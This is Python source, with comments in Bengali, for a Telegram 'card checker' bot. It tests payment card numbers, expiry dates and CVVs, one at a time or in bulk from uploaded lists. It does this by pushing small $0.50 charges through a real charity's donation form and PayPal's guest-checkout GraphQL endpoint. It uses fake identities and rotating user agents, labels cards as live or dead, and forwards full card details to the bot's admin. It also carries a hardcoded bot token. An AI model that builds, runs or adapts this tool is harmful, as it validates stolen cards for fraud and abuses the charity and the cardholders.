import re, json, random, time, requests, string, os, asyncio
from fake_useragent import UserAgent
from faker import Faker
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from flask import Flask
import threading
from datetime import datetime

# ============ কনফিগারেশন ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8948469626:AAEXfCsjBH4_IhnTtIaEJ4LAbodXGq0qWx0")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "1978055060"))
PORT = int(os.environ.get("PORT", 8080))

USERS_FILE = "users.json"
APPROVED_USERS_FILE = "approved_users.json"

fake = Faker()

# ============ ডাটাবেস ফাংশন ============
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f)

def load_approved():
    if os.path.exists(APPROVED_USERS_FILE):
        with open(APPROVED_USERS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_approved(approved):
    with open(APPROVED_USERS_FILE, 'w') as f:
        json.dump(approved, f)

# ============ BIN LOOKUP ফাংশন ============
def get_bin_info(card_number):
    bin_num = card_number[:6]
    try:
        url = f"https://binlist.io/lookup/{bin_num}/"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'bin': bin_num,
                'brand': data.get('scheme', 'N/A').upper(),
                'type': data.get('type', 'N/A'),
                'level': data.get('level', 'N/A'),
                'bank': data.get('bank', {}).get('name', 'N/A'),
                'country': data.get('country', {}).get('name', 'N/A'),
                'country_code': data.get('country', {}).get('alpha2', 'N/A'),
                'emoji': data.get('country', {}).get('emoji', '🌍'),
                'phone': data.get('bank', {}).get('phone', 'N/A')
            }
    except:
        pass
    
    return {
        'bin': bin_num,
        'brand': 'UNKNOWN',
        'type': 'UNKNOWN', 
        'level': 'UNKNOWN',
        'bank': 'UNKNOWN',
        'country': 'UNKNOWN',
        'country_code': 'XX',
        'emoji': '🌍',
        'phone': 'N/A'
    }

# ============ কার্ড চেক ফাংশন ============
def check_card(card_num, card_mon, card_yer, card_cvc):
    try:
        ua = UserAgent()
        us = ua.random
        session = requests.Session()
        
        url = "https://www.brightercommunities.org/donate-form/"
        headers = {'User-Agent': us}
        resp = session.get(url, headers=headers, timeout=10)
        
        hash_match = re.search(r'name="give-form-hash" value="([^"]+)"', resp.text)
        form_match = re.search(r'name="give-form-id" value="([^"]+)"', resp.text)
        prefix_match = re.search(r'name="give-form-id-prefix" value="([^"]+)"', resp.text)
        
        if not hash_match or not form_match or not prefix_match:
            return "ERROR: Form data not found"
        
        hash_val = hash_match.group(1)
        form_id = form_match.group(1)
        prefix = prefix_match.group(1)
        
        order_url = "https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
        payload = {
            'give-form-id-prefix': prefix,
            'give-form-id': form_id,
            'give-form-minimum': '0.50',
            'give-form-hash': hash_val,
            'give-amount': '0.50',
            'give_first': fake.first_name(),
            'give_last': fake.last_name(),
            'give_email': fake.email()
        }
        
        resp2 = session.post(order_url, data=payload, headers=headers, timeout=10)
        order_data = resp2.json()
        order_id = order_data.get("data", {}).get("id")
        
        if not order_id:
            return "ERROR: Order ID not created"
        
        graphql_url = "https://www.paypal.com/graphql?fetch_credit_form_submit="
        
        first_digit = card_num[0]
        card_types = {'3': 'JCB', '4': 'VISA', '5': 'MASTER_CARD', '6': 'DISCOVER'}
        card_type = card_types.get(first_digit, "Unknown")
        
        query = """
            mutation payWithCard(
                $token: String!
                $card: CardInput
                $paymentToken: String
                $phoneNumber: String
                $firstName: String
                $lastName: String
                $shippingAddress: AddressInput
                $billingAddress: AddressInput
                $email: String
                $currencyConversionType: CheckoutCurrencyConversionType
                $installmentTerm: Int
                $identityDocument: IdentityDocumentInput
                $feeReferenceId: String
            ) {
                approveGuestPaymentWithCreditCard(
                    token: $token
                    card: $card
                    paymentToken: $paymentToken
                    phoneNumber: $phoneNumber
                    firstName: $firstName
                    lastName: $lastName
                    email: $email
                    shippingAddress: $shippingAddress
                    billingAddress: $billingAddress
                    currencyConversionType: $currencyConversionType
                    installmentTerm: $installmentTerm
                    identityDocument: $identityDocument
                    feeReferenceId: $feeReferenceId
                ) {
                    flags {
                        is3DSecureRequired
                    }
                    cart {
                        intent
                        cartId
                        buyer {
                            userId
                            auth {
                                accessToken
                            }
                        }
                        returnUrl {
                            href
                        }
                    }
                    paymentContingencies {
                        threeDomainSecure {
                            status
                            method
                            redirectUrl {
                                href
                            }
                            parameter
                        }
                    }
                }
            }
        """
        
        variables = {
            "token": order_id,
            "card": {
                "cardNumber": card_num,
                "type": card_type,
                "expirationDate": f'{card_mon}/{card_yer}',
                "postalCode": fake.zipcode(),
                "securityCode": card_cvc
            },
            "phoneNumber": fake.phone_number(),
            "firstName": fake.first_name(),
            "lastName": fake.last_name(),
            "billingAddress": {
                "givenName": fake.first_name(),
                "familyName": fake.last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode()
            },
            "shippingAddress": {
                "givenName": fake.first_name(),
                "familyName": fake.last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode()
            },
            "email": fake.email(),
            "currencyConversionType": "PAYPAL"
        }
        
        payload_graphql = {"query": query, "variables": variables, "operationName": None}
        headers_graphql = {'User-Agent': us, 'Content-Type': 'application/json'}
        
        resp3 = session.post(graphql_url, data=json.dumps(payload_graphql), headers=headers_graphql, timeout=15)
        response_text = resp3.text
        
        if "accessToken" in response_text or "cartId" in response_text:
            return "LIVE_CHARGED"
        elif "INVALID_SECURITY_CODE" in response_text:
            return "LIVE_CVV"
        elif "INSUFFICIENT_FUNDS" in response_text or "INVALID_BILLING_ADDRESS" in response_text:
            return "LIVE_INSUFFICIENT"
        elif "EXPIRED_CARD" in response_text:
            return "DIE_EXPIRED"
        elif "ISSUER_DECLINE" in response_text:
            return "DIE_DECLINE"
        else:
            return "DIE_UNKNOWN"
            
    except Exception as e:
        return f"ERROR: {str(e)}"

# ============ টেলিগ্রাম হ্যান্ডলার ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    
    users = load_users()
    if str(user_id) not in users:
        users[str(user_id)] = {
            'name': user_name,
            'username': update.effective_user.username,
            'date': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        save_users(users)
        
        admin_text = f"🆕 NEW USER REGISTERED!\n\n👤 Name: {user_name}\n🆔 ID: {user_id}\n📛 Username: @{update.effective_user.username}\n📅 Date: {users[str(user_id)]['date']}\n\n🔓 Approve: /approve {user_id}"
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text)
    
    approved_users = load_approved()
    
    welcome_text = f"""🔥 CARD CHECKER BOT v3.0

Welcome {user_name}!

━━━━━━━━━━━━━━━━
📌 STATUS: {'✅ APPROVED' if user_id in approved_users else '⏳ PENDING'}
━━━━━━━━━━━━━━━━

⚡️ Features:
• Single Card Check
• Bulk File Check with Progress
• Live Results During Check
• BIN Info with Country/Bank
• Card Copy Function
• Time Tracker

💡 How to use:
1️⃣ Single: number|month|year|cvv
2️⃣ File: Send .txt file

📝 Example:
4000000000000000|12|2026|123

━━━━━━━━━━━━━━━━
👑 Bot by @thispersonisbrand
"""
    
    keyboard = []
    if user_id in approved_users:
        keyboard = [
            [InlineKeyboardButton("🔍 SINGLE CHECK", callback_data='check_card')],
            [InlineKeyboardButton("📁 FILE CHECK", callback_data='file_check')],
            [InlineKeyboardButton("ℹ️ BIN LOOKUP", callback_data='bin_lookup')],
            [InlineKeyboardButton("📊 MY INFO", callback_data='my_info')]
        ]
    else:
        keyboard = [[InlineKeyboardButton("⏳ WAITING APPROVAL", callback_data='waiting')]]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(welcome_text, reply_markup=reply_markup)

# ফাইল চেক বাটন
async def file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    approved_users = load_approved()
    
    if user_id not in approved_users:
        await query.message.reply_text("❌ You are not approved!")
        return
    
    await query.message.reply_text(
        "📁 FILE CHECK\n\n"
        "Send a .txt file containing cards.\n\n"
        "Format (one per line):\n"
        "`card|month|year|cvv`\n\n"
        "Example:\n"
        "`4000000000000000|12|2026|123`\n"
        "`4111111111111111|01|2027|456`\n\n"
        "⚠️ I will show progress and live results!"
    )
    context.user_data['awaiting_file'] = True

# ফাইল প্রসেসিং ফাংশন
async def process_file_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path):
    cards = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and '|' in line:
                    parts = line.split('|')
                    if len(parts) == 4:
                        cards.append({
                            'num': parts[0].strip(),
                            'mon': parts[1].strip(),
                            'yer': parts[2].strip(),
                            'cvc': parts[3].strip()
                        })
    except Exception as e:
        return None, str(e)
    
    if not cards:
        return None, "No valid cards found!"
    
    total = len(cards)
    live_cards = []
    checked = 0
    
    # প্রোগ্রেস মেসেজ
    start_time = time.time()
    progress_msg = await update.message.reply_text(
        f"📁 FILE CHECK STARTED\n━━━━━━━━━━━━━━━━\n"
        f"📊 Total Cards: {total}\n"
        f"⏳ Progress: 0/{total} (0%)\n"
        f"✅ Live Found: 0\n"
        f"⏱️ Elapsed: 0s\n━━━━━━━━━━━━━━━━\n\n"
        f"🔄 Checking cards..."
    )
    
    for i, card in enumerate(cards, 1):
        # Year format fix
        yer = card['yer']
        if len(yer) == 4:
            yer = yer[2:]
        
        # কার্ড চেক
        result = check_card(card['num'], card['mon'], yer, card['cvc'])
        
        elapsed = int(time.time() - start_time)
        percent = int((i / total) * 100)
        
        # লাইভ কার্ড পাওয়া গেলে সাথে সাথে দেখানো
        if result in ["LIVE_CHARGED", "LIVE_CVV", "LIVE_INSUFFICIENT"]:
            live_cards.append({
                'card': card,
                'result': result,
                'bin': get_bin_info(card['num'])
            })
            
            # লাইভ কার্ডের ডিটেইলস মেসেজ
            live_status = "🔥 CHARGED" if result == "LIVE_CHARGED" else "⚡️ CVV LIVE" if result == "LIVE_CVV" else "💰 INSUFFICIENT"
            bin_info = get_bin_info(card['num'])
            
            live_msg = f"""✅ LIVE CARD FOUND! #{len(live_cards)}

💳 {card['num']}|{card['mon']}|{yer}|{card['cvc']}
📊 Status: {live_status}
🏦 {bin_info['brand']} - {bin_info['country']}
━━━━━━━━━━━━━━━━"""
            
            await update.message.reply_text(live_msg)
        
        # প্রতি 5 কার্ডে বা শেষে প্রোগ্রেস আপডেট
        if i % 5 == 0 or i == total:
            await progress_msg.edit_text(
                f"📁 FILE CHECK IN PROGRESS\n━━━━━━━━━━━━━━━━\n"
                f"📊 Total Cards: {total}\n"
                f"⏳ Progress: {i}/{total} ({percent}%)\n"
                f"✅ Live Found: {len(live_cards)}\n"
                f"⏱️ Elapsed: {elapsed}s\n"
                f"🕐 Est. Remaining: {int((elapsed/i)*(total-i))}s\n━━━━━━━━━━━━━━━━\n\n"
                f"🔄 Checking: {card['num'][:4]}****{card['num'][-4:]}"
            )
        
        # রেট লিমিট এড়ানোর জন্য ডিলে
        await asyncio.sleep(2)
    
    # ফাইনাল রিপোর্ট
    end_time = time.time()
    total_time = int(end_time - start_time)
    
    # লাইভ কার্ডের লিস্ট
    live_list = ""
    for idx, lc in enumerate(live_cards, 1):
        status_icon = "🔥" if lc['result'] == "LIVE_CHARGED" else "⚡️" if lc['result'] == "LIVE_CVV" else "💰"
        live_list += f"{idx}. {status_icon} {lc['card']['num']}|{lc['card']['mon']}|{lc['card']['yer']}|{lc['card']['cvc']}\n"
    
    if not live_list:
        live_list = "No live cards found!"
    
    final_report = f"""📁 FILE CHECK COMPLETE
━━━━━━━━━━━━━━━━
📊 STATISTICS:
• Total Cards: {total}
• Live Cards: {len(live_cards)}
• Dead Cards: {total - len(live_cards)}
• Success Rate: {(len(live_cards)/total*100):.1f}%

⏱️ TIME TAKEN:
• Started: {time.strftime('%H:%M:%S', time.localtime(start_time))}
• Ended: {time.strftime('%H:%M:%S', time.localtime(end_time))}
• Duration: {total_time} seconds

✅ LIVE CARDS FOUND:
{live_list}
━━━━━━━━━━━━━━━━
"""
    
    await progress_msg.delete()
    
    # রিপোর্ট太长 হলে ভাগ করে পাঠানো
    if len(final_report) > 4000:
        for i in range(0, len(final_report), 4000):
            await update.message.reply_text(final_report[i:i+4000])
    else:
        await update.message.reply_text(final_report)
    
    # অ্যাডমিন রিপোর্ট
    admin_report = f"""📁 FILE CHECK REPORT

👤 User: {update.effective_user.first_name}
🆔 ID: {update.effective_user.id}
📊 Total: {total}
✅ Live: {len(live_cards)}
⏱️ Time: {total_time}s
"""
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_report)
    
    return live_cards, None

# ফাইল ডকুমেন্ট হ্যান্ডলার
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_file'):
        return
    
    user_id = update.effective_user.id
    approved_users = load_approved()
    
    if user_id not in approved_users:
        await update.message.reply_text("❌ You are not approved!")
        context.user_data['awaiting_file'] = False
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file!")
        return
    
    # ফাইল ডাউনলোড
    status_msg = await update.message.reply_text("📥 Downloading file...")
    file = await context.bot.get_file(document.file_id)
    file_path = f"temp_{user_id}_{int(time.time())}.txt"
    await file.download_to_drive(file_path)
    await status_msg.delete()
    
    # ফাইল প্রসেস
    await process_file_cards(update, context, file_path)
    
    # ক্লিনআপ
    if os.path.exists(file_path):
        os.remove(file_path)
    
    context.user_data['awaiting_file'] = False

# অন্যান্য হ্যান্ডলার (আগের মতো)
async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    try:
        user_id = int(context.args[0])
        approved_users = load_approved()
        
        if user_id not in approved_users:
            approved_users.append(user_id)
            save_approved(approved_users)
            
            await update.message.reply_text(f"✅ User {user_id} approved!")
            
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text="✅ APPROVED! You can now use the bot.\nSend /start to begin."
                )
            except:
                pass
        else:
            await update.message.reply_text(f"⚠️ User already approved!")
    except:
        await update.message.reply_text("❌ Usage: /approve <user_id>")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    try:
        user_id = int(context.args[0])
        approved_users = load_approved()
        
        if user_id in approved_users:
            approved_users.remove(user_id)
            save_approved(approved_users)
            
            await update.message.reply_text(f"✅ User {user_id} removed!")
            
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text="⚠️ Your access has been revoked!"
                )
            except:
                pass
        else:
            await update.message.reply_text(f"⚠️ User not found!")
    except:
        await update.message.reply_text("❌ Usage: /remove <user_id>")

async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    users = load_users()
    approved = load_approved()
    
    text = "📊 USERS LIST\n━━━━━━━━━━━━━━━━\n\n"
    for uid, info in users.items():
        uid_int = int(uid)
        status = "✅" if uid_int in approved else "⏳"
        text += f"{status} {info['name']}\n🆔 {uid}\n━━━━━━━━━━━━━━━━\n"
    
    await update.message.reply_text(text)

async def check_card_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    approved_users = load_approved()
    
    if user_id not in approved_users:
        await query.message.reply_text("❌ Not approved!")
        return
    
    await query.message.reply_text(
        "🔍 SEND CARD\n\n"
        "Format: `number|month|year|cvv`\n"
        "Example: `4000000000000000|12|2026|123`"
    )
    context.user_data['awaiting_card'] = True

async def bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.message.reply_text(
        "🔍 BIN LOOKUP\n\n"
        "Send first 6 digits:\n"
        "Example: `400000`"
    )
    context.user_data['awaiting_bin'] = True

async def my_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    text = f"""📊 MY INFO

👤 Name: {user.first_name}
🆔 ID: {user.id}
📛 Username: @{user.username}
⭐️ Premium: {'Yes' if user.is_premium else 'No'}
✅ Status: APPROVED
"""
    await query.message.reply_text(text)

async def waiting(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("⏳ Pending approval. Wait for admin.")

async def handle_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_card'):
        return
    
    user_id = update.effective_user.id
    approved_users = load_approved()
    
    if user_id not in approved_users:
        await update.message.reply_text("❌ Not approved!")
        context.user_data['awaiting_card'] = False
        return
    
    card_text = update.message.text.strip()
    parts = card_text.split('|')
    
    if len(parts) != 4:
        await update.message.reply_text("❌ Invalid format!\nUse: number|month|year|cvv")
        return
    
    card_num = parts[0].strip()
    card_mon = parts[1].strip()
    card_yer = parts[2].strip()
    card_cvc = parts[3].strip()
    
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    bin_info = get_bin_info(card_num)
    
    status_msg = await update.message.reply_text("⏳ CHECKING...")
    start_time = time.time()
    
    result = check_card(card_num, card_mon, card_yer, card_cvc)
    
    elapsed = int(time.time() - start_time)
    await status_msg.delete()
    
    if result == "LIVE_CHARGED":
        status = "✅ LIVE CHARGED"
        status_emoji = "🔥"
    elif result == "LIVE_CVV":
        status = "⚡️ CVV LIVE"
        status_emoji = "💳"
    elif result == "LIVE_INSUFFICIENT":
        status = "💰 INSUFFICIENT FUNDS"
        status_emoji = "💵"
    else:
        status = "❌ DIE"
        status_emoji = "💀"
    
    result_text = f"""{status_emoji} CARD RESULT {status_emoji}
━━━━━━━━━━━━━━━━
{status}
━━━━━━━━━━━━━━━━

💳 CARD: {card_num}|{card_mon}|{card_yer}|{card_cvc}

🏦 BIN INFO:
• BIN: {bin_info['bin']}
• Brand: {bin_info['brand']}
• Type: {bin_info['type']}
• Bank: {bin_info['bank']}
• Country: {bin_info['emoji']} {bin_info['country']}

⏱️ Time: {elapsed}s
━━━━━━━━━━━━━━━━
"""
    
    keyboard = [[InlineKeyboardButton("📋 COPY", callback_data=f"copy_{card_num}|{card_mon}|{card_yer}|{card_cvc}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(result_text, reply_markup=reply_markup)
    
    admin_msg = f"🔔 Card Checked\n👤 {update.effective_user.first_name}\n💳 {card_num}|{card_mon}|{card_yer}|{card_cvc}\n📊 {status}"
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
    
    context.user_data['awaiting_card'] = False

async def handle_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_bin'):
        return
    
    bin_num = update.message.text.strip()[:6]
    
    if not bin_num.isdigit() or len(bin_num) < 6:
        await update.message.reply_text("❌ Send 6 digits!")
        return
    
    bin_info = get_bin_info(bin_num)
    
    text = f"""🔍 BIN RESULT
━━━━━━━━━━━━━━━━
📊 BIN: {bin_info['bin']}
💳 Brand: {bin_info['brand']}
📝 Type: {bin_info['type']}
🏦 Bank: {bin_info['bank']}
🌍 Country: {bin_info['emoji']} {bin_info['country']}
━━━━━━━━━━━━━━━━
"""
    
    await update.message.reply_text(text)
    context.user_data['awaiting_bin'] = False

async def copy_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    
    if data.startswith("copy_"):
        card_details = data.replace("copy_", "")
        await query.answer(f"✅ Copied: {card_details}", show_alert=True)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Error: {context.error}")

# ============ ফ্লাস্ক সার্ভার ============
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

@app.route('/health')
def health():
    return "OK", 200

def run_flask():
    app.run(host='0.0.0.0', port=PORT)

# ============ মেইন ============
def main():
    threading.Thread(target=run_flask, daemon=True).start()
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # কমান্ড
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("users", users_list))
    
    # কলব্যাক
    application.add_handler(CallbackQueryHandler(check_card_button, pattern='check_card'))
    application.add_handler(CallbackQueryHandler(file_check, pattern='file_check'))
    application.add_handler(CallbackQueryHandler(bin_lookup, pattern='bin_lookup'))
    application.add_handler(CallbackQueryHandler(my_info, pattern='my_info'))
    application.add_handler(CallbackQueryHandler(waiting, pattern='waiting'))
    application.add_handler(CallbackQueryHandler(copy_card, pattern='^copy_'))
    
    # মেসেজ
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_card))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_bin))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    application.add_error_handler(error_handler)
    
    print("🤖 BOT STARTED!")
    print(f"✅ Admin: {ADMIN_ID}")
    
    application.run_polling()

if __name__ == '__main__':
    main()
